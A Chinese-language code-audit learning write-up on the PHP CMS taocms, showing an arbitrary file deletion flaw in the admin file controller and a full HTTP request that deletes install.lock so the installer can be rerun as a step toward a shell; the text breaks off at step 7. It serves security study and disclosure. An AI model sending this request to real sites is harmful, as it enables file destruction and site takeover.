## taocms 代码审计学习

## 背景
在 github 中发现了一套开源的 php 类型的 taocms，被很多大佬提交了issue。自己对php代码的审计不是很熟悉，本着学习的态度，简单测试了一下。
链接：https://github.com/taogogo/taocms

![image](https://user-images.githubusercontent.com/39737245/179382789-8da786c3-1211-4f2b-9c36-b879c78fadf7.png)

## 尝试重装 getshell

1. 打开 taocms/include/Model/File.php，发现文件删除的代码，请求的路径为 `admin.php?action=file&ctrl=del&path=`，path 参数可控

![image](https://user-images.githubusercontent.com/39737245/179346909-19d27934-3f65-458a-877c-2d64d205edf5.png)
![image](https://user-images.githubusercontent.com/39737245/179341807-abf00881-056b-44b8-9bea-488f3b575131.png)

2. 当 taocms 安装时，在 data 目录下会生成一个 install.lock 文件。

![image](https://user-images.githubusercontent.com/39737245/179341924-316ea8c6-83c1-4a72-8d85-5c5fd3a16fbb.png)

3. 当安装完成后，再次访问 install.php 时，会提示不能再次安装，所以想再次安装必须删除 install.lock 文件。

![image](https://user-images.githubusercontent.com/39737245/179342073-215bee64-5d34-428a-8f4f-5a5a506605d8.png)

4. 因为存在任意文件删除，我们可以通过下面的请求来删除 install.lock 文件。

```
GET /admin/admin.php?action=file&ctrl=del&path=/data/install.lock HTTP/1.1
Host: 127.0.0.1:9999
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://127.0.0.1:9999/admin/admin.php?action=file&ctrl=lists
Cookie: PHPSESSID=tnbrlgg1g539t0mjovqs1vrgio
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: frame
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```

5. install.lock 文件删除成功

![image](https://user-images.githubusercontent.com/39737245/179342236-1c55b3bb-22a0-4ab2-9b37-6c90a9143003.png)

6. 这时，重新访问 install.php，已经可以显示安装页面。

![image](https://user-images.githubusercontent.com/39737245/179342306-39cc40e9-fa11-4a69-adf4-a7e1a985b553.png)

7. 
